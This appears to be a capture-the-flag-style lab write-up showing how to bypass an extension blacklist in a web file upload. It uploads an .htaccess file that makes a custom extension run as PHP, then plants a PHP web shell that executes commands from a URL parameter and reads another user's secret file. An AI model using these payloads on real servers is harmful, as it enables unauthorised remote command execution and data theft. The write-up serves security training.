# File Upload Web Shell Upload via Extension Blacklist Bypass

## Objective
Exploit a file upload vulnerability to bypass extension blacklist restrictions and upload a malicious file (web shell). Use the web shell to retrieve Carlos's secret.

---

## Solution

### Step 1: Log in and upload an image
1. Log in to the lab with the provided credentials.
2. Navigate to the **My Account** section and upload an image (e.g., `test.jpg`) as your avatar.
3. Verify that the image is displayed on your account page.

---

### Step 2: Intercept the request for the uploaded image
1. Open **Burp Suite** and go to **Proxy > HTTP history**.
2. Locate the **GET** request to `/files/avatars/<YOUR-IMAGE>`.
3. Right-click the request and send it to **Burp Repeater**.

---

### Step 3: Attempt to upload a malicious PHP file
1. On your local system, create a PHP file called `exploit.php` with the following content:

    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```

2. Attempt to upload `exploit.php` as your avatar.
3. Observe that the server rejects the file because `.php` extensions are not allowed.

---

### Step 4: Investigate the file upload request
1. In **Burp Proxy**, find the **POST** request to `/my-account/avatar` used to upload the file.
2. Right-click and send this request to **Burp Repeater**.
3. Inspect the response headers to confirm that the server is running Apache.

---

### Step 5: Upload a `.htaccess` file to enable PHP execution for a custom extension
1. In **Burp Repeater**, modify the `POST /my-account/avatar` request body:

    - Change the `filename` parameter to `.htaccess`.
    - Change the `Content-Type` header to `text/plain`.

2. Replace the file content with the following Apache directive:

    ```
    AddType application/x-httpd-php .l33t
    ```

3. Send the request and ensure the file is uploaded successfully.

---

### Step 6: Upload the malicious PHP payload with the new extension
1. In **Burp Repeater**, modify the `POST /my-account/avatar` request again:

    - Change the `filename` parameter to `exploit2.l33t`.
    - Change the `Content-Type` header to `text/plain`.

2. Replace the file content with the following PHP payload:

    ```php
    <?php system($_GET['cmd']); ?>
    ```

3. Send the request and verify that the file is uploaded successfully.

---

### Step 7: Execute the web shell to retrieve Carlos's secret
1. In **Burp Repeater**, use the **GET** request to `/files/avatars/exploit2.l33t` to execute the payload.
2. Append a `cmd` parameter to the URL to fetch the secret:

    ```
    /files/avatars/exploit2.l33t?cmd=cat /home/carlos/secret
    ```

3. Observe the response containing Carlos's secret.

![File Upload Web Shell Upload via Extension Blacklist Bypass Lab4](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab4a.PNG)

![File Upload Web Shell Upload via Extension Blacklist Bypass Lab4](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab4b.PNG)

![File Upload Web Shell Upload via Extension Blacklist Bypass Lab4](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab4c.PNG)

![File Upload Web Shell Upload via Extension Blacklist Bypass Lab4](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab4e.PNG)

![File Upload Web Shell Upload via Extension Blacklist Bypass Lab4](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab4f.PNG)
---

### Final Notes
- Ensure you handle each request carefully to avoid missteps.
- This solution demonstrates how extension blacklist bypass can allow malicious file uploads. Always validate file uploads on the server side to prevent such vulnerabilities.

---
